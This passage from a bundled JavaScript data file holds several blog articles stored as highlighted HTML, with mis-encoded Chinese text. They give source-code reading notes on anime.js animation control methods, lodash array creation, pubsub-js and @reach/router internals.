 <span class=\\"hljs-keyword\\">for</span> (<span class=\\"hljs-keyword\\">let</span> n = <span class=\\"hljs-number\\">0</span>; n &lt; toNumbersLength; n++) {\\n      <span class=\\"hljs-keyword\\">let</span> value;\\n      <span class=\\"hljs-keyword\\">const</span> toNumber = tween.to.numbers[n];\\n      <span class=\\"hljs-keyword\\">const</span> fromNumber = tween.from.numbers[n];\\n      <span class=\\"hljs-keyword\\">if</span> (!tween.isPath) {\\n        <span class=\\"hljs-comment\\">// è®¡ç®—å½“å‰å…·ä½“ä½ç½®</span>\\n        value = fromNumber + (eased * (toNumber - fromNumber));\\n      } <span class=\\"hljs-keyword\\">else</span> {\\n        <span class=\\"hljs-comment\\">// è¿›è¡ŒSVG pathè®¡ç®—</span>\\n        value = getPathProgress(tween.value, eased * toNumber);\\n      }\\n      <span class=\\"hljs-comment\\">/* ... */</span>\\n      numbers.push(value);\\n    }\\n         <span class=\\"hljs-comment\\">/* ... */</span>\\n        <span class=\\"hljs-keyword\\">if</span> (!<span class=\\"hljs-built_in\\">isNaN</span>(n)) {\\n          <span class=\\"hljs-comment\\">// ç»„åˆå•ä½ \'135.546\'+\'px\'</span>\\n          <span class=\\"hljs-keyword\\">if</span> (!b) {\\n            progress += n + <span class=\\"hljs-string\\">\' \'</span>;\\n          } <span class=\\"hljs-keyword\\">else</span> {\\n            progress += n + b;\\n          }\\n        }\\n    <span class=\\"hljs-comment\\">/* ... */</span>\\n    <span class=\\"hljs-comment\\">// ç»„åˆç»“æœ \'translateX(\'+\'135.546px\'+\')`</span>\\n    setTweenProgress[anim.type](animatable.target, anim.property, progress, transforms, animatable.id);\\n    anim.currentValue = progress;\\n    i++;\\n  }\\n  <span class=\\"hljs-comment\\">// éå†ç»“æœï¼Œé€ä¸ªtargetèµ‹å€¼</span>\\n  <span class=\\"hljs-keyword\\">const</span> transformsLength = <span class=\\"hljs-built_in\\">Object</span>.keys(transforms).length;\\n  <span class=\\"hljs-keyword\\">if</span> (transformsLength) {\\n    <span class=\\"hljs-keyword\\">for</span> (<span class=\\"hljs-keyword\\">let</span> id = <span class=\\"hljs-number\\">0</span>; id &lt; transformsLength; id++) {\\n      <span class=\\"hljs-keyword\\">if</span> (!transformString) {\\n        <span class=\\"hljs-keyword\\">const</span> t = <span class=\\"hljs-string\\">\'transform\'</span>;\\n        <span class=\\"hljs-comment\\">// é…ç½®å…¼å®¹æ€§</span>\\n        transformString = (getCSSValue(<span class=\\"hljs-built_in\\">document</span>.body, t) ? t : <span class=\\"hljs-string\\">`-webkit-<span class=\\"hljs-subst\\">${t}</span>`</span>);\\n      }\\n      <span class=\\"hljs-comment\\">// è®¾ç½®style</span>\\n      instance.animatables[id].target.style[transformString] = transforms[id].join(<span class=\\"hljs-string\\">\' \'</span>);\\n    }\\n  }\\n  <span class=\\"hljs-comment\\">// è®°å½•å½“å‰ä½ç½®æ‰€å¯¹åº”çš„æ—¶é—´</span>\\n  instance.currentTime = insTime;\\n  <span class=\\"hljs-comment\\">// è®¾ç½®è¿›åº¦</span>\\n  instance.progress = (insTime / instance.duration) * <span class=\\"hljs-number\\">100</span>;\\n}</code></pre></code></pre>\\n<p>å‰©ä¸‹çš„å°±æ˜¯ä¸€äº›æ“ä½œå‡½æ•°äº†ï¼š</p>\\n<ul>\\n<li><p>instance.seek </p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-comment\\">// ç›´æ¥è·³åˆ°å‚æ•°timeçš„æ—¶é—´æ‰€åœ¨çš„ä½ç½®</span>\\ninstance.seek = <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span>(<span class=\\"hljs-params\\">time</span>) </span>{\\nsetInstanceProgress(adjustTime(time));\\n}</code></pre></code></pre>\\n</li>\\n<li><p>instance.pause</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-comment\\">// å¤–éƒ¨API æš‚åœ</span>\\ninstance.pause = <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span>(<span class=\\"hljs-params\\"></span>) </span>{\\n<span class=\\"hljs-keyword\\">const</span> i = activeInstances.indexOf(instance);\\n<span class=\\"hljs-comment\\">// åˆ é™¤activeInstances åç»­engineä¸­æ‰¾ä¸åˆ°ä¾¿ä¸ä¼šæ‰§è¡Œ</span>\\n<span class=\\"hljs-keyword\\">if</span> (i &gt; <span class=\\"hljs-number\\">-1</span>) activeInstances.splice(i, <span class=\\"hljs-number\\">1</span>);\\ninstance.paused = <span class=\\"hljs-literal\\">true</span>;\\n}</code></pre></code></pre>\\n</li>\\n<li><p>instance.reverse</p>\\n</li>\\n</ul>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-comment\\">// å¤–éƒ¨API åè½¬</span>\\ninstance.reverse = <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span>(<span class=\\"hljs-params\\"></span>) </span>{\\n  toggleInstanceDirection();\\n  startTime = <span class=\\"hljs-number\\">0</span>;\\n  lastTime = adjustTime(instance.currentTime);\\n}</code></pre></code></pre>\\n<ul>\\n<li>instance.restart</li>\\n</ul>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-comment\\">// å¤–éƒ¨API é‡æ–°æ‰§è¡Œ</span>\\ninstance.restart = <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span>(<span class=\\"hljs-params\\"></span>) </span>{\\n  instance.pause();\\n  instance.reset();\\n  instance.play();\\n}</code></pre></code></pre>\\n<ul>\\n<li>instance.reset<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-comment\\">// å¤–éƒ¨API reset</span>\\ninstance.reset = <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span>(<span class=\\"hljs-params\\"></span>) </span>{\\n<span class=\\"hljs-keyword\\">const</span> direction = instance.direction;\\n<span class=\\"hljs-keyword\\">const</span> loops = instance.loop;\\n<span class=\\"hljs-comment\\">// å½“å‰ä½ç½®,è¿›åº¦ å½’é›¶</span>\\ninstance.currentTime = <span class=\\"hljs-number\\">0</span>;\\ninstance.progress = <span class=\\"hljs-number\\">0</span>;\\ninstance.paused = <span class=\\"hljs-literal\\">true</span>;\\ninstance.began = <span class=\\"hljs-literal\\">false</span>;\\ninstance.completed = <span class=\\"hljs-literal\\">false</span>;\\ninstance.reversed = direction === <span class=\\"hljs-string\\">\'reverse\'</span>;\\ninstance.remaining = direction === <span class=\\"hljs-string\\">\'alternate\'</span> &amp;&amp; loops === <span class=\\"hljs-number\\">1</span> ? <span class=\\"hljs-number\\">2</span> : loops;\\nsetAnimationsProgress(<span class=\\"hljs-number\\">0</span>);\\n<span class=\\"hljs-keyword\\">for</span> (<span class=\\"hljs-keyword\\">let</span> i = instance.children.length; i--; ){\\n  instance.children[i].reset();\\n}\\n}</code></pre></code></pre>\\n</li>\\n</ul>\\n<h2 id=\\"zong-jie\\">æ€»ç»“</h2>\\n<ol>\\n<li>ä½¿ç”¨äº†<code>requestAnimateFrame</code>å’Œ<code>CSS</code>åŠ¨ç”»æé«˜æµç•…åº¦ã€‚</li>\\n<li>ä½¿ç”¨äº†ç¼“åŠ¨å‡½æ•°ï¼Œåªéœ€è¦é€šè¿‡<code>å½“å‰åŠ¨ç”»æ¶ˆè€—çš„æ—¶é—´</code>ï¼Œæ­é…å…¶ä»–å®šä¹‰çš„é…ç½®é¡¹ï¼Œå°±å¯ä»¥è®¡ç®—å‡ºå½“å‰åŠ¨ç”»å…·ä½“ä½ç½®ã€‚</li>\\n</ol>\\n<p>æ­¤æ¬¡è§£æå°±åˆ°è¿™é‡Œç»“æŸï¼Œå¦‚æœ‰é”™è¯¯ï¼Œæ•¬è¯·æŒ‡å‡ºï¼Œæ„Ÿè°¢ï¼</p>\\n","toc":[{"anchor":"zong-jie","level":2,"text":"æ€»ç»“"}],"relatedTags":null,"created_at":"2018-07-22","timeArr":[2018,6,22,0,0,0,0],"title":"æºç é˜…è¯»-è§£æanimeæ ¸å¿ƒ(2)","uuid":"2a9c7da01d48a31e62efc8c651405161597524f1","summary":"<p>æœ¬æ¬¡è§£æå°†åˆ†ä¸º2ç¯‡æ–‡ç« ï¼Œå½“å‰æ˜¯ç¬¬äºŒç¯‡ï¼Œç¬¬ä¸€ç¯‡åœ¨<a href=\\"./07-20-%E8%A7%A3%E6%9E%90anime%E6%A0%B8%E5%BF%83(1).md\\">è¿™é‡Œ</a></p>\\n<p>å¦å¤–ï¼Œä¸ºäº†èƒ½æ›´å¥½çš„ç†è§£è¿™ä¸ªåº“ï¼Œä¸ªäººå†™äº†ä¸€ä¸ªæ­¤åº“çš„å‹ç¼©ç‰ˆï¼Œå®ç°äº†æ ¸å¿ƒçš„åŠŸèƒ½(ä¸»è¦ä¹Ÿæ˜¯ä¸ºäº†æ›´å¥½ç†è§£æ ¸å¿ƒåŠŸèƒ½)ï¼Œå†…å®¹æ›´å°‘æ–¹ä¾¿é˜…è¯»ï¼Œ\\nåœ°å€åœ¨[è¿™é‡Œ](https://github.com/stonehank/simpli...</p>","slug":"yuan-ma-yue-du-jie-xi-anime-he-xin-(2)","sha":"a9f78f786c764a619cefc5156e3120771d547641"}')},668:function(n){n.exports=JSON.parse('{"content":"<h4 id=\\"chuang-jian-shu-zu-de-si-kao\\">åˆ›å»ºæ•°ç»„çš„æ€è€ƒ</h4>\\n<p><code>lodash.js---&gt;.internal--&gt;baseClone.js</code>å†…éƒ¨</p>\\n<p>æœ‰ä¸€å¥ï¼š<code>const result = new array.constructor(length)</code></p>\\n<p>è¿™é‡Œarrayæ˜¯ä¸€ä¸ªç»è¿‡<code>Array.isArray(array)===true</code>åˆ¤æ–­çš„æ•°ç»„ï¼Œ</p>\\n<p>è¿™å¥è¯å°±æ˜¯ä½¿ç”¨åŸæ•°ç»„çš„æ„é€ å‡½æ•°å»åˆ›å»ºï¼Œå‚æ•°æ˜¯åŸæ•°ç»„çš„é•¿åº¦ã€‚</p>\\n<p>é‚£ä¹ˆä¸ºä»€ä¹ˆä¸ç›´æ¥<code>const result = new Array(length)</code></p>\\n<p>å› ä¸ºå¦‚æœæˆ‘ä»¬ä½¿ç”¨äº†è‡ªå®šä¹‰æ„é€ å‡½æ•°ï¼Œ<code>new Array</code>åˆ™ä¼šå°†è‡ªå®šä¹‰æ–¹æ³•éƒ½åˆ é™¤</p>\\n<p>ä¾‹å¦‚ï¼š</p>\\n<p>ä¸€ä¸ªè‡ªå®šä¹‰æ„é€ å‡½æ•°(Array),åŒ…å«è‡ªå®šä¹‰sumå’Œavgæ–¹æ³•</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">CustomArray</span>(<span class=\\"hljs-params\\">length=<span class=\\"hljs-number\\">0</span></span>)</span>{\\n  <span class=\\"hljs-keyword\\">let</span> custom=<span class=\\"hljs-built_in\\">Object</span>.create([],<span class=\\"hljs-built_in\\">Array</span>.prototype)\\n  <span class=\\"hljs-keyword\\">let</span> proto=<span class=\\"hljs-built_in\\">Object</span>.getPrototypeOf(custom)\\n  proto.constructor=CustomArray\\n  proto.sum=<span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span>(<span class=\\"hljs-params\\"></span>)</span>{\\n    <span class=\\"hljs-keyword\\">return</span> <span class=\\"hljs-keyword\\">this</span>.reduce(<span class=\\"hljs-function\\">(<span class=\\"hljs-params\\">acc,cur</span>)=&gt;</span>acc+cur,<span class=\\"hljs-number\\">0</span>)\\n  }\\n  proto.avg=<span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span>(<span class=\\"hljs-params\\"></span>)</span>{\\n    <span class=\\"hljs-keyword\\">return</span> <span class=\\"hljs-keyword\\">this</span>.sum()/<span class=\\"hljs-keyword\\">this</span>.length\\n  }\\n  <span class=\\"hljs-keyword\\">return</span> custom\\n}</code></pre></code></pre>\\n<p>éªŒè¯ï¼š</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">let</span> myArray=<span class=\\"hljs-keyword\\">new</span> CustomArray()\\nmyArray.push(<span class=\\"hljs-number\\">5</span>)\\nmyArray.push(<span class=\\"hljs-number\\">6</span>)\\nmyArray.push(<span class=\\"hljs-number\\">7</span>)\\nmyArray.sum() <span class=\\"hljs-comment\\">// 18</span>\\nmyArray.avg() <span class=\\"hljs-comment\\">// 6</span></code></pre></code></pre>\\n<p>ä½¿ç”¨<code>new array.constructor</code></p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">const</span> {length}=myArray\\n<span class=\\"hljs-keyword\\">const</span> result = <span class=\\"hljs-keyword\\">new</span> myArray.constructor(length)\\nresult.push(<span class=\\"hljs-number\\">5</span>)\\nresult.push(<span class=\\"hljs-number\\">6</span>)\\nresult.push(<span class=\\"hljs-number\\">7</span>)\\nresult.sum()   <span class=\\"hljs-comment\\">// 18</span>\\nresult.avg()   <span class=\\"hljs-comment\\">// 6</span></code></pre></code></pre>\\n<p>ä½¿ç”¨<code>new Array</code></p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">const</span> {length}=myArray\\n<span class=\\"hljs-keyword\\">const</span> resultRaw = <span class=\\"hljs-keyword\\">new</span> <span class=\\"hljs-built_in\\">Array</span>(length)\\nresultRaw.push(<span class=\\"hljs-number\\">5</span>)\\nresultRaw.push(<span class=\\"hljs-number\\">6</span>)\\nresultRaw.push(<span class=\\"hljs-number\\">7</span>)\\nresultRaw.sum()   <span class=\\"hljs-comment\\">// æŠ¥é”™ not a function</span>\\nresultRaw.avg()   <span class=\\"hljs-comment\\">// æŠ¥é”™ not a function</span></code></pre></code></pre>\\n","toc":[{"anchor":"chuang-jian-shu-zu-de-si-kao","level":4,"text":"åˆ›å»ºæ•°ç»„çš„æ€è€ƒ"}],"relatedTags":null,"created_at":"2018-08-16","timeArr":[2018,7,16,0,0,0,0],"title":"æºç é˜…è¯»-lodash-ä¸€ä¸ªåˆ›å»ºæ•°ç»„çš„æ€è€ƒ","uuid":"0d719ffaecb85402ef37b03bbd557d9adf641cd7","summary":"<h4>åˆ›å»ºæ•°ç»„çš„æ€è€ƒ</h4>\\n<p><code>lodash.js---&gt;.internal--&gt;baseClone.js</code>å†…éƒ¨</p>\\n<p>æœ‰ä¸€å¥ï¼š<code>const result = new array.constructor(length)</code></p>\\n<p>è¿™é‡Œarrayæ˜¯ä¸€ä¸ªç»è¿‡<code>Array.isArray(array)===true</code>åˆ¤æ–­çš„æ•°ç»„ï¼Œ</p>\\n<p>è¿™å¥...</p>","slug":"yuan-ma-yue-du-lodash-yi-ge-chuang-jian-shu-zu-de-si-kao","sha":"7166eb621f1c1bf86fd6cf194dc19b9f3f408810"}')},669:function(n){n.exports=JSON.parse('{"content":"<blockquote>\\n<p>pubsub-js: ä¸€ä¸ªç”¨ JavaScript ç¼–å†™çš„<code>åŸºäºä¸»é¢˜</code>çš„å‘å¸ƒ/è®¢é˜…åº“</p>\\n</blockquote>\\n<hr>\\n<p><code>pubsub-js</code>ä»£ç é‡ä¸å¤§ï¼Œä»£ç é€»è¾‘ä¹Ÿè¾ƒç®€å•ï¼Œä¹Ÿç¡®å®å®Œæˆäº†ä¸€ä¸ªå‘å¸ƒè®¢é˜…åº“ï¼ŒåŸºäº<code>javascript</code>çš„<code>key:value</code>æ™®é€šå¯¹è±¡ã€‚</p>\\n<p>ä»£ç ç»“æ„</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code>messages={\\n   <span class=\\"hljs-attr\\">topic1</span>:{\\n        <span class=\\"hljs-attr\\">token1_1</span>:<span class=\\"hljs-built_in\\">Function</span>,\\n        <span class=\\"hljs-attr\\">token1_2</span>:<span class=\\"hljs-built_in\\">Function</span>,\\n    }, \\n   <span class=\\"hljs-attr\\">topic2</span>:{\\n        <span class=\\"hljs-attr\\">token2_1</span>:<span class=\\"hljs-built_in\\">Function</span>,\\n        <span class=\\"hljs-attr\\">token2_2</span>:<span class=\\"hljs-built_in\\">Function</span>,\\n        ...\\n    }, \\n    ...\\n}</code></pre></code></pre>\\n<p>è¿™ä¸ª<code>åŸºäºä¸»é¢˜</code>ç»“æ„ï¼Œå…è®¸å¯¹åŒä¸€ä¸ªä¸»é¢˜è¿›è¡Œå¤šæ¬¡ä¸åŒçš„è®¢é˜…ï¼Œå› æ­¤æ¯æ¬¡è®¢é˜…ä¼šè¿”å›ä¸€ä¸ª<code>token</code>å¯ä»¥é€šè¿‡<code>unsubscribe</code>å¯¹\\n<code>token</code>å–æ¶ˆè®¢é˜…ï¼Œ</p>\\n<p><code>unsubscribe</code>ä¹Ÿæ¥æ”¶<code>topic</code>(ä¸»é¢˜çš„åç§°)ï¼Œå¯¹å½“å‰ä¸»é¢˜ä¸‹æ‰€æœ‰<code>token</code>å–æ¶ˆè®¢é˜…ï¼Œä¹Ÿæ¥æ”¶<code>function</code>ï¼Œåˆ é™¤æ‰€æœ‰ä¸å‚æ•°ä¸€è‡´çš„è®¢é˜…å‡½æ•°ã€‚</p>\\n<p>åŒæ—¶<code>pubsub-js</code>ä¹Ÿæä¾›äº†å±‚çº§è®¢é˜…ï¼Œé€šè¿‡<code>.</code>è¿›è¡Œåˆ†çº§ï¼Œä¾‹å¦‚å½“è®¢é˜…äº†<code>a</code>å’Œ<code>a.b</code>æ—¶ï¼Œå‘å¸ƒ<code>a.b</code>åŒæ—¶ä¹Ÿä¼šè§¦å‘<code>a</code>çš„è®¢é˜…ï¼Œè€Œé€šé…ç¬¦<code>*</code>åˆ™è¡¨ç¤ºä»»ä½•å‘å¸ƒéƒ½å°†è§¦å‘å®ƒçš„è®¢é˜…ã€‚</p>\\n<blockquote>\\n<p><strong>æ³¨æ„ï¼š<code>pubsub-js</code>æ˜¯ä¸€ä¸ªç®€å•çš„å‘å¸ƒè®¢é˜…åº“ï¼Œå¹¶ä¸èƒ½è§£å†³çœŸæ­£çš„å¼‚æ­¥é—®é¢˜ã€‚</strong></p>\\n</blockquote>\\n<hr>\\n<p>æ€ç»´å¯¼å›¾ï¼š\\n<img src=\\"/article/img/PubSub.png\\" alt=\\"\\"></p>\\n","toc":[],"relatedTags":null,"created_at":"2021-07-04","timeArr":[2021,6,4,0,0,0,0],"title":"æºç é˜…è¯»-pubsub-js","uuid":"c25645355b6dce51d5f91ed9b939fbd7ebe06b10","summary":"<p>pubsub-js: ä¸€ä¸ªç”¨ JavaScript ç¼–å†™çš„<code>åŸºäºä¸»é¢˜</code>çš„å‘å¸ƒ/è®¢é˜…åº“</p>","slug":"yuan-ma-yue-du-pubsub-js","sha":"be93b5efb118c66f3435d9e3e61ac32f3af7211a"}')},670:function(n){n.exports=JSON.parse('{"content":"<h2 id=\\"popstate\\">popstate</h2>\\n<p>åªåœ¨æµè§ˆå™¨ä¸‹å‰è¿›åé€€å’Œæ”¹å˜hashè§¦å‘ï¼Œ<code>pushState</code>å’Œ<code>replaceState</code>å¹¶ä¸ä¼šè§¦å‘</p>\\n<p>æºç ä¸­ç»™<code>popstate</code>å’Œ<code>navigate</code>äº‹ä»¶ç»‘å®šäº†ä¸€æ—¦æ‰§è¡Œå°±æ›´æ–°å½“å‰location(ä¼ é€’åˆ°contextä¸­çš„)</p>\\n<h2 id=\\"ti-dai-pushstate-he-replacestate\\">æ›¿ä»£pushStateå’ŒreplaceState</h2>\\n<p>æºç ä¸­å¯¹<code>pushState</code>å’Œ<code>replaceState</code>æ“ä½œç”¨<code>try...catch</code>åŒ…è£¹ï¼Œå› ä¸ºæœ‰ä¸€ä¸ªbugï¼Œ<a href=\\"https://forums.developer.apple.com/thread/36650\\">iOS Safari limits to 100 pushState calls</a></p>\\n<p>å› æ­¤å½“å‡ºç°catchï¼Œä¼šæ‰§è¡Œ<code>location.replace</code>æˆ–è€…<code>location.assign</code></p>\\n<ul>\\n<li><code>location.replace</code> è·³è½¬urlï¼Œæ›¿ä»£å½“å‰ï¼Œä¸å¢åŠ å†å²è®°å½•</li>\\n<li><code>location.assign</code> è·³è½¬urlï¼Œå¢åŠ å†å²è®°å½•</li>\\n</ul>\\n<h2 id=\\"createcontextdefaultvalue\\">createContext(defaultValue)</h2>\\n<p>å®˜æ–¹(è‹±æ–‡)ï¼š</p>\\n<blockquote>\\n<p>If there is no Provider for this context above, the value argument will be equal to the defaultValue that was passed to createContext().</p>\\n</blockquote>\\n<p>ä¸­æ–‡æ–‡æ¡£ï¼š</p>\\n<blockquote>\\n<p>å¦‚æœä¸Šå±‚çš„ç»„ä»¶æ ‘æ²¡æœ‰ä¸€ä¸ªåŒ¹é…çš„ Providerï¼Œè€Œæ­¤æ—¶ä½ éœ€è¦æ¸²æŸ“ä¸€ä¸ª Consumer ç»„ä»¶ï¼Œé‚£ä¹ˆä½ å¯ä»¥ç”¨åˆ° defaultValue ã€‚è¿™æœ‰åŠ©äºåœ¨ä¸å°è£…å®ƒä»¬çš„æƒ…å†µä¸‹å¯¹ç»„ä»¶è¿›è¡Œæµ‹è¯•ã€‚</p>\\n</blockquote>\\n<p>æºç ä¸­è¿™ä¹ˆç”¨çš„</p>\\n<pre><code class=\\"language-jsx\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">const</span> createNamedContext = <span class=\\"hljs-function\\">(<span class=\\"hljs-params\\">name, defaultValue</span>) =&gt;</span> {\\n  <span class=\\"hljs-keyword\\">const</span> Ctx = createContext(defaultValue);\\n  Ctx.Consumer.displayName = <span class=\\"hljs-string\\">`<span class=\\"hljs-subst\\">${name}</span>.Consumer`</span>;\\n  Ctx.Provider.displayName = <span class=\\"hljs-string\\">`<span class=\\"hljs-subst\\">${name}</span>.Provider`</span>;\\n  <span class=\\"hljs-keyword\\">return</span> Ctx;\\n};\\n\\n<span class=\\"hljs-keyword\\">let</span> BaseContext = createNamedContext(<span class=\\"hljs-string\\">\\"Base\\"</span>, { <span class=\\"hljs-attr\\">baseuri</span>: <span class=\\"hljs-string\\">\\"/\\"</span>, <span class=\\"hljs-attr\\">basepath</span>: <span class=\\"hljs-string\\">\\"/\\"</span> });\\n\\n<span class=\\"hljs-keyword\\">let</span> Router = <span class=\\"hljs-function\\"><span class=\\"hljs-params\\">props</span> =&gt;</span> (\\n  &lt;BaseContext.Consumer&gt;\\n    {/* æ­¤å¤„baseContextæ˜¯ { baseuri: \\"/\\", basepath: \\"/\\" } */}\\n    {baseContext =&gt; (\\n      &lt;Location&gt;\\n        {locationContext =&gt; (\\n          &lt;RouterImpl {...baseContext} {...locationContext} {...props} /&gt;\\n        )}\\n      &lt;/Location&gt;\\n    )}\\n  &lt;/BaseContext.Consumer&gt;</code></pre></code></pre>\\n<h2 id=\\"gong-ju-jie-shao--invariant\\">å·¥å…·ä»‹ç» invariant</h2>\\n<p><code>invariant(boolean,something)</code> å‚æ•°1ä¸ºfalseå°±<code>throw å‚æ•°2(something)</code></p>\\n<h2 id=\\"react-zhong-elementtype\\">reactä¸­element.type</h2>\\n<p>ç”¨æ¥åˆ¤æ–­ç»„ä»¶çš„ç±»å‹</p>\\n<p>ä¾‹å¦‚ï¼š</p>\\n<pre><code class=\\"language-jsx\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-comment\\">// 1ã€é«˜é˜¶ç»„ä»¶</span>\\n<span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">HOC</span>(<span class=\\"hljs-params\\">com</span>)</span>{\\n  <span class=\\"hljs-keyword\\">return</span> <span class=\\"hljs-class\\"><span class=\\"hljs-keyword\\">class</span> <span class=\\"hljs-keyword\\">extends</span> <span class=\\"hljs-title\\">React</span>.<span class=\\"hljs-title\\">Component</span></span>{\\n    render(){\\n      <span class=\\"hljs-keyword\\">return</span> &lt;com /&gt;\\n    }\\n  }\\n}\\n<span class=\\"hljs-comment\\">// 2ã€è‡ªå®šä¹‰ç»„ä»¶</span>\\n<span class=\\"hljs-class\\"><span class=\\"hljs-keyword\\">class</span> <span class=\\"hljs-title\\">MyComponent</span> <span class=\\"hljs-keyword\\">extends</span> <span class=\\"hljs-title\\">React</span>.<span class=\\"hljs-title\\">Component</span></span>{\\n    render(){\\n        <span class=\\"hljs-keyword\\">return</span> &lt;div&gt;...&lt;/div&gt;\\n    }\\n}\\n<span class=\\"hljs-comment\\">// 3ã€æ— çŠ¶æ€ç»„ä»¶</span>\\n<span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">DumbComponent</span>(<span class=\\"hljs-params\\">props</span>)</span>{\\n    <span class=\\"hljs-keyword\\">return</span> &lt;button&gt;show&lt;/button&gt;\\n}\\n<span class=\\"hljs-comment\\">// 4ã€åŸç”Ÿæ ‡ç­¾ï¼ˆç›´æ¥å†™åˆ°childrené‡Œï¼‰</span>\\n\\n<span class=\\"hljs-comment\\">// åˆ¤æ–­</span>\\n<span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">checkType</span>(<span class=\\"hljs-params\\">element</span>)</span>{\\n    <span class=\\"hljs-keyword\\">let</span> type=element.type\\n    <span class=\\"hljs-keyword\\">if</span>(type.prototype &amp;&amp; type.prototype.isReactComponent){\\n        <span class=\\"hljs-built_in\\">console</span>.log(<span class=\\"hljs-string\\">\'è‡ªå®šä¹‰Reactç»„ä»¶\'</span>)\\n    }<span class=\\"hljs-keyword\\">else</span> <span class=\\"hljs-keyword\\">if</span>(<span class=\\"hljs-keyword\\">typeof</span> type === <span class=\\"hljs-string\\">\'function\'</span>){\\n        <span class=\\"hljs-built_in\\">console</span>.log(<span class=\\"hljs-string\\">\'æ˜¯ä¸€ä¸ªå‡½æ•°ï¼ˆé«˜é˜¶å‡½æ•°ï¼‰ï¼Œç»§ç»­è°ƒç”¨\'</span>)\\n    }<span class=\\"hljs-keyword\\">else</span> <span class=\\"hljs-keyword\\">if</span>(<span class=\\"hljs-keyword\\">typeof</span> type === <span class=\\"hljs-string\\">\'string\'</span>){\\n        <span class=\\"hljs-built_in\\">console</span>.log(<span class=\\"hljs-string\\">\'æ˜¯ä¸€ä¸ªåŸç”Ÿæ ‡ç­¾\'</span>)\\n    }<span class=\\"hljs-keyword\\">else</span>{\\n        <span class=\\"hljs-built_in\\">console</span>.log(<span class=\\"hljs-string\\">\'å…¶ä»–\'</span>)\\n    }\\n}\\n<span class=\\"hljs-class\\"><span class=\\"hljs-keyword\\">class</span> <span class=\\"hljs-title\\">Check</span> <span class=\\"hljs-keyword\\">extends</span> <span class=\\"hljs-title\\">React</span>.<span class=\\"hljs-title\\">Component</span></span>{\\n  render(){\\n    React.Children.map(<span class=\\"hljs-keyword\\">this</span>.props.children,element=&gt;{\\n      checkType(element)\\n    })\\n    <span class=\\"hljs-keyword\\">return</span> &lt;div /&gt;\\n  }\\n}\\nReactDOM.render(\\n  &lt;Check&gt;\\n    &lt;HOC /&gt;      \\n    &lt;MyComponent /&gt;\\n    &lt;DumbComponent /&gt;\\n    &lt;div /&gt;\\n  &lt;/Check&gt;,\\n  <span class=\\"hljs-built_in\\">document</span>.getElementById(<span class=\\"hljs-string\\">\'container\'</span>)\\n);\\n<span class=\\"hljs-comment\\">/*\\n\\"æ˜¯ä¸€ä¸ªå‡½æ•°ï¼ˆé«˜é˜¶å‡½æ•°ï¼‰ï¼Œç»§ç»­è°ƒç”¨\\"\\n\\"è‡ªå®šä¹‰Reactç»„ä»¶\\"\\n\\"æ˜¯ä¸€ä¸ªå‡½æ•°ï¼ˆé«˜é˜¶å‡½æ•°ï¼‰ï¼Œç»§ç»­è°ƒç”¨\\"ï¼ˆæ­¤å¤„æ— çŠ¶æ€å‡½æ•°ç»„ä»¶ä¼šè¢«è®¤ä¸ºå‡½æ•°ï¼‰\\n\\"æ˜¯ä¸€ä¸ªåŸç”Ÿæ ‡ç­¾\\"\\n*/</span></code></pre></code></pre>\\n<p>æºç ä¸­ç”¨æ¥æ£€æµ‹æ˜¯å¦é‡å®šå‘ç»„ä»¶ï¼š</p>\\n<pre><code class=\\"language-jsx\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-class\\"><span class=\\"hljs-keyword\\">class</span> <span class=\\"hljs-title\\">RouterImpl</span> <span class=\\"hljs-keyword\\">extends</span> <span class=\\"hljs-title\\">React</span>.<span class=\\"hljs-title\\">PureComponent</span> </span>{\\n    render(){\\n        <span class=\\"hljs-comment\\">/* å…¶ä»–ä»£ç  */</span>\\n        <span class=\\"hljs-keyword\\">let</span> routes = React.Children.map(children, createRoute(basepath));\\n        <span class=\\"hljs-comment\\">/* å…¶ä»–ä»£ç  */</span>\\n    }        \\n}\\n\\n<span class=\\"hljs-keyword\\">let</span> createRoute = <span class=\\"hljs-function\\"><span class=\\"hljs-params\\">basepath</span> =&gt;</span> <span class=\\"hljs-function\\"><span class=\\"hljs-params\\">element</span> =&gt;</span> {\\n    <span class=\\"hljs-comment\\">// element.type === Redirect ç”¨äºæ£€æµ‹æ˜¯å¦æŸä¸ªç»„ä»¶</span>\\n    invariant(\\n        element.props.path || element.props.default || element.type === Redirect,\\n        <span class=\\"hljs-string\\">`&lt;Router&gt;: Children of &lt;Router&gt; must have a \\\\`path\\\\` or \\\\`default\\\\` prop, or be a \\\\`&lt;Redirect&gt;\\\\`. None found on element type \\\\`<span class=\\"hljs-subst\\">${\\n         element.type\\n        }</span>\\\\``</span>\\n     );\\n  <span class=\\"hljs-comment\\">/* å…¶ä»–ä»£ç  */</span>\\n}\\n\\n<span class=\\"hljs-comment\\">// 